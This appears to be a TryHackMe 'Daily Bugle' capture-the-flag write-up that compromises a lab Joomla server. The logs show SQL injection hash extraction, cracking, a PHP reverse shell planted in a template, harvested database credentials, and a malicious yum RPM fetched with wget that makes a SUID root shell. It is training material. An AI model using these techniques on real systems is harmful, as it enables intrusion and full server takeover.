#CTF #THM

Today we are looking at a Superman style theme room called Daily Bugle.

There is not much of any notes or instruction to go off of here, but I see in the title we are supposed to compromise a Joomla with SQLi and practice cracking hashes and escalate privileges by taking advantage of yum.

Room Difficulty: HARD

Task 1 - Deploy
-----------------------------

First checking if we are live:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ ping 10.10.238.201                        
PING 10.10.238.201 (10.10.238.201) 56(84) bytes of data.
64 bytes from 10.10.238.201: icmp_seq=1 ttl=63 time=260 ms
64 bytes from 10.10.238.201: icmp_seq=2 ttl=63 time=259 ms
^C
--- 10.10.238.201 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 258.946/259.260/259.574/0.314 ms

```

Our target is up, let's get an nmap scan:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ nmap -sV -sC -oN dailybugle 10.10.238.201       
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-21 08:11 JST
Nmap scan report for 10.10.238.201
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds
```

Ok, so ssh is open, apache on port 80 with looks like joomla and a mysql db n 3306/tcp.

Also of note is a robots.txt.

Going to check the web server and robots.txt 1st.

Browsing the website, I see an article about Spiderman robbing the bank.

Question: Access the web server, who robbed the bank?
Answer: _spiderman_


```
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Trying some basic SQLi in the login:

```
' or 1=1 -- -
```

Doesn't seem affected.

Using burpsuite to grab this:

```
POST /index.php HTTP/1.1

Host: 10.10.238.201

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 142

Origin: http://10.10.238.201

Connection: close

Referer: http://10.10.238.201/

Cookie: eaa83fe8b963ab08ce9ab7d4a798de05=cosle19turi9advvd3m5cs0ob7

Upgrade-Insecure-Requests: 1



username=admin&password=hacked&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEwLjIzOC4yMDEv&3019bba7e7146a8bce0befd332b3083b=1
```

So running SQLmap I see this:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ sqlmap -r request.txt --dbms=mysql --dump       
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.9#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:28:34 /2022-10-21/

[08:28:34] [INFO] parsing HTTP request from 'request.txt'
[08:28:35] [WARNING] provided value for parameter 'Submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[08:28:35] [INFO] testing connection to the target URL
got a 303 redirect to 'http://10.10.238.201:80/index.php/component/users/?view=login&Itemid=101'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[08:28:52] [INFO] testing if the target URL content is stable
[08:28:53] [WARNING] POST parameter 'username' does not appear to be dynamic
[08:28:53] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[08:28:54] [INFO] testing for SQL injection on POST parameter 'username'
[08:28:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:28:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:28:56] [INFO] testing 'Generic inline queries'
[08:28:57] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:28:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:28:59] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)                   
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[08:29:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:29:32] [WARNING] POST parameter 'username' does not seem to be injectable
[08:29:32] [WARNING] POST parameter 'password' does not appear to be dynamic
[08:29:32] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[08:29:33] [INFO] testing for SQL injection on POST parameter 'password'
[08:29:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:29:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:29:35] [INFO] testing 'Generic inline queries'
[08:29:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:29:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:29:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:29:44] [WARNING] POST parameter 'password' does not seem to be injectable
[08:29:44] [WARNING] POST parameter 'Submit' does not appear to be dynamic
[08:29:44] [WARNING] heuristic (basic) test shows that POST parameter 'Submit' might not be injectable
[08:29:45] [INFO] testing for SQL injection on POST parameter 'Submit'
[08:29:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:29:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:29:47] [INFO] testing 'Generic inline queries'
[08:29:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:29:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:29:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:29:56] [WARNING] POST parameter 'Submit' does not seem to be injectable
[08:29:56] [WARNING] POST parameter 'option' does not appear to be dynamic
[08:29:56] [WARNING] heuristic (basic) test shows that POST parameter 'option' might not be injectable
[08:29:56] [INFO] testing for SQL injection on POST parameter 'option'
[08:29:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:30:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:30:01] [INFO] testing 'Generic inline queries'
[08:30:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:30:03] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:30:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:30:07] [WARNING] POST parameter 'option' does not seem to be injectable
[08:30:07] [WARNING] POST parameter 'task' does not appear to be dynamic
[08:30:07] [WARNING] heuristic (basic) test shows that POST parameter 'task' might not be injectable
[08:30:07] [INFO] testing for SQL injection on POST parameter 'task'
[08:30:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:30:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:30:11] [INFO] testing 'Generic inline queries'
[08:30:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:30:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:30:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:30:17] [WARNING] POST parameter 'task' does not seem to be injectable
[08:30:17] [WARNING] POST parameter 'return' does not appear to be dynamic
[08:30:17] [WARNING] heuristic (basic) test shows that POST parameter 'return' might not be injectable
[08:30:18] [INFO] testing for SQL injection on POST parameter 'return'
[08:30:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:30:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:30:20] [INFO] testing 'Generic inline queries'
[08:30:20] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:30:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:30:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:30:29] [WARNING] POST parameter 'return' does not seem to be injectable
[08:30:29] [WARNING] POST parameter '3019bba7e7146a8bce0befd332b3083b' does not appear to be dynamic
[08:30:29] [WARNING] heuristic (basic) test shows that POST parameter '3019bba7e7146a8bce0befd332b3083b' might not be injectable
[08:30:29] [INFO] testing for SQL injection on POST parameter '3019bba7e7146a8bce0befd332b3083b'
[08:30:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:30:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:30:32] [INFO] testing 'Generic inline queries'
[08:30:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:30:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:30:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[08:30:41] [WARNING] POST parameter '3019bba7e7146a8bce0befd332b3083b' does not seem to be injectable
[08:30:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[08:30:41] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 30 times, 500 (Internal Server Error) - 29 times

[*] ending @ 08:30:41 /2022-10-21/
```

Doesn't look like any vulnerabilities here. Interesting tho since this is a SQL based room.

I need to dig deeper.

I start gobuster and start that scanning. Again while it is running I see administrator hidden directory.

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ gobuster dir -u http://10.10.238.201 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.238.201
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/21 08:35:44 Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 239] [--> http://10.10.238.201/templates/]
/media                (Status: 301) [Size: 235] [--> http://10.10.238.201/media/]    
/modules              (Status: 301) [Size: 237] [--> http://10.10.238.201/modules/]  
/images               (Status: 301) [Size: 236] [--> http://10.10.238.201/images/]   
/bin                  (Status: 301) [Size: 233] [--> http://10.10.238.201/bin/]      
/plugins              (Status: 301) [Size: 237] [--> http://10.10.238.201/plugins/]  
/includes             (Status: 301) [Size: 238] [--> http://10.10.238.201/includes/] 
/language             (Status: 301) [Size: 238] [--> http://10.10.238.201/language/] 
/components           (Status: 301) [Size: 240] [--> http://10.10.238.201/components/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.238.201/cache/]     
/libraries            (Status: 301) [Size: 239] [--> http://10.10.238.201/libraries/] 
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.238.201/tmp/]       
/layouts              (Status: 301) [Size: 237] [--> http://10.10.238.201/layouts/]   
/administrator        (Status: 301) [Size: 243] [--> http://10.10.238.201/administrator/]
/cli                  (Status: 301) [Size: 233] [--> http://10.10.238.201/cli/]          
                                                                                         
===============================================================
2022/10/21 08:59:53 Finished
===============================================================
```

I decided to check that out while gobuster is running.

The backend also doesn't seem suspeptible to basic SQL injection. I need to find a vulnerability. If I could just figure out the version.

I found a page here:
https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website

It shows how to get the Joomla version from a few different URL techniques on the site.

For example:
**For Joomla websites >= 1.5.0 and <= 1.5.26**

Joomla websites in the 1.5.x line do not have the _joomla.xml_ file, but there is another link that one can check, which is this one:

_http://www.[thejoomlawebsite].com/language/en-GB/en-GB.xml_

You can clearly see, in the XML _version_ element, the version of the Joomla website in question. However, the problem here is that this method only reveals the major version, and not the minor version. The minor version is typically guessed by checking some core JavaScript files under the _media/system/js_ folder.

Navigating to:
http://10.10.238.201/language/en-GB/en-GB.xml

Gives me this:
```
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
<creationDate>April 2017</creationDate>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>
Copyright (C) 2005 - 2017 Open Source Matters. All rights reserved.
</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<description>en-GB site language</description>
<metadata>
<name>English (en-GB)</name>
<nativeName>English (United Kingdom)</nativeName>
<tag>en-GB</tag>
<rtl>0</rtl>
<locale>
en_GB.utf8, en_GB.UTF-8, en_GB, eng_GB, en, english, english-uk, uk, gbr, britain, england, great britain, uk, united kingdom, united-kingdom
</locale>
<firstDay>0</firstDay>
<weekEnd>0,6</weekEnd>
<calendar>gregorian</calendar>
</metadata>
<params/>
</metafile>
```

Bingo! We have our version.

Task 2 - Obtain User and Root
-----------------------------------------------

It is getting hard to tell where one task ends and the next starts. Since the Joomla version is on Task 2 I will answer that  here.

Question: What is the Joomla version?
Answer: _3.7.0_

Next I found this script to try and exploit:
https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py

Running the script:

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ python3 joomblah.py http://10.10.238.201
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Let's run John and see if we can get the PW from that hash. It looks like bcrypt.

```
┌──(kali㉿kali)-[~/pentesting/tryhackme.com/daily-bugle]
└─$ /usr/sbin/john dailybugle.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:08:56 DONE (2022-10-21 09:20) 0.001865g/s 87.35p/s 87.35c/s 87.35C/s sweetsmile..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Sweet!

Question: What was Jonah's cracked Password?
Answer: _spiderman123_

(break)

On coming back I tried SSH and cannot SSH into the box.

I went to the Webportal:
http://10.10.94.65/administrator/index.php

and logged in with jonah:spiderman123

Looking like I need to put some kinda webshell in here and use that to get a reverse-shell on the box.

So I used the pentestmonkey php script since I use it a lot and it's quite good:

http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz

I changed the variable at the top of the script to point to our local tun0 IP.

Then naviate to edit the index.php and place our revised ph-reverse-shell.php at the top of that index.php

http://10.10.94.65/administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA

Hit Save.

Then go start a listener:

```
root@ip-10-10-8-251:~# nc -lnvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
```

Nagivate back to the sites index:
http://10.10.94.65/index.php and get a shell:

```
Connection from 10.10.94.65 38582 received!
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:31:59 up 27 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$ whoami
whoami
apache
sh-4.2$ 
```

Stablize the shell:

```
sh-4.2$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.2$ ^Z
[1]+  Stopped                 nc -lnvp 1234
root@ip-10-10-8-251:~# stty raw -echo
root@ip-10-10-8-251:~# nc -lnvp 1234

bash-4.2$ export TERM=XTERM
```

Spend a bit of time here enumerating. Then it occured to me to check the config files for joomla for any other credentials.

Found this gem in /var/www/html/configuration.php

```
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
--More--(33%)
        public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
--More--(69%)
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
        public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
}
bash-4.2$ 
```

So we have a password there.

Trying that for the only user on the system jjameson:

```
ash-4.2$ su jjameson           
Password: 
[jjameson@dailybugle html]$ cd /home
[jjameson@dailybugle home]$ cd jjameson
[jjameson@dailybugle ~]$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
[jjameson@dailybugle ~]$ whoami
jjameson
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ 

```

Sweet! We got flag #1.

Question: What is the user flag?
Answer: _27a260fe3cba712cfdedb1c86d80442e_


Ok so let's try to escalate to root.

Looking around I don't see a cron running:

```
[jjameson@dailybugle ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
```

Looks like sudo -l only shows yum:

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Well, looks like there is a way to use yum. Checking on GTFObins I see

https://gtfobins.github.io/gtfobins/yum/#sudo


So on my local machine I had to build a Redhat compatible rpm.  

	run from my local machine/attackbox
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

For that on my local Kali machine I needed fpm which isn't included with Debian. obvs. I didn't have another CentOS VM handy but after some digging I found there was a Ruby gem for this.  After checking Ruby was already installed with the ruby-dev stuff, I just installed the gem.

```
gem install fpm
```

Then ran that last 'fpm' command which failed previously again.

Then with the package created I start a simple web server to host it locally:

```
python3 -m http.server 8000
```

Then back on the victim host as jjameson I just use wget to pull it over:

```
[jjameson@dailybugle ~]$ wget http://10.10.8.251:8000/x-1.0-1.noarch.rpm
--2022-10-21 00:08:46--  http://10.10.8.251:8000/x-1.0-1.noarch.rpm
Connecting to 10.10.8.251:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6106 (6.0K) [application/x-redhat-package-manager]
Saving to: 'x-1.0-1.noarch.rpm'

100%[======================================>] 6,106       --.-K/s   in 0s      

2022-10-21 00:08:46 (472 MB/s) - 'x-1.0-1.noarch.rpm' saved [6106/6106]
```

So now I just install that:

```
[jjameson@dailybugle ~]$ sudo yum localinstall -y x-1.0-1.noarch.rpm 
Loaded plugins: fastestmirror
Examining x-1.0-1.noarch.rpm: x-1.0-1.noarch
Marking x-1.0-1.noarch.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package x.noarch 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved

================================================================================
 Package     Arch             Version           Repository                 Size
================================================================================
Installing:
 x           noarch           1.0-1             /x-1.0-1.noarch           3.0  

Transaction Summary
================================================================================
Install  1 Package

Total size: 3  
Installed size: 3  
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
uid=0(root) gid=0(root) groups=0(root)
  Installing : x-1.0-1.noarch                                               1/1 
  Verifying  : x-1.0-1.noarch                                               1/1 

Installed:
  x.noarch 0:1.0-1                                                              

Complete!
[jjameson@dailybugle ~]$ 
```

	notice the uid=0(root) it ran under.

So now we just need to make another package that will create a SUID copy of /bin/bash;

	from my local machine/attack box:
```
root@ip-10-10-8-251:~# TF=$(mktemp -d)
root@ip-10-10-8-251:~# echo 'cp /bin/bash /tmp/shell && chmod +s /tmp/shell' > $TF/x.sh
root@ip-10-10-8-251:~# fpm -n a -s dir -t rpm -a all --before-install $TF/x.sh $TF
Created package {:path=>"a-1.0-1.noarch.rpm"}
root@ip-10-10-8-251:~# 
```

With my simple webserver still running on port 8080 I should just be able to pull it over now with wget from the victim:

```
[jjameson@dailybugle ~]$ wget http://10.10.8.251:8000/a-1.0-1.noarch.rpm
--2022-10-21 00:21:41--  http://10.10.8.251:8000/a-1.0-1.noarch.rpm
Connecting to 10.10.8.251:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6183 (6.0K) [application/x-redhat-package-manager]
Saving to: 'a-1.0-1.noarch.rpm'

100%[======================================>] 6,183       --.-K/s   in 0s      

2022-10-21 00:21:41 (625 MB/s) - 'a-1.0-1.noarch.rpm' saved [6183/6183]
```

Ok let's install it like we did before:

```
[jjameson@dailybugle ~]$ sudo yum localinstall -y a-1.0-1.noarch.rpm    
Loaded plugins: fastestmirror
Examining a-1.0-1.noarch.rpm: a-1.0-1.noarch
Marking a-1.0-1.noarch.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package a.noarch 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved

================================================================================
 Package     Arch             Version           Repository                 Size
================================================================================
Installing:
 a           noarch           1.0-1             /a-1.0-1.noarch            47  

Transaction Summary
================================================================================
Install  1 Package

Total size: 47  
Installed size: 47  
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : a-1.0-1.noarch                                               1/1 
  Verifying  : a-1.0-1.noarch                                               1/1 

Installed:
  a.noarch 0:1.0-1                                                              

Complete!
```

Is it there?

```
[jjameson@dailybugle ~]$ ls -al /tmp/shell
-rwsr-sr-x 1 root root 964600 Oct 21 00:21 /tmp/shell
```

Oh ya baby,  flags too :)

Let's pop our root shell:

```
[jjameson@dailybugle ~]$ /tmp/shell -p
shell-4.2# whoami
root
```

So let's grab our final flag:

```
shell-4.2# cd /root
shell-4.2# ls
anaconda-ks.cfg  root.txt
shell-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```

Question: What is the root flag?
Answer: _eec3d53292b1821868266858d7fa6f79_


Conclusion:
----------------------------


Overall this room was a bit harder than all the others. Just because there was very little instruction to go off of. But I guess we've learned well up to this point to be able to get this far.

I spent way too much time eumerating I feel. I should have looked at the configuration.php right away.   I tend to get excited when I first get a foothold on the machine with some type of initial shell.  I need to delevop some more playbooks for enumeration in different scenarios to get to root the fastest.


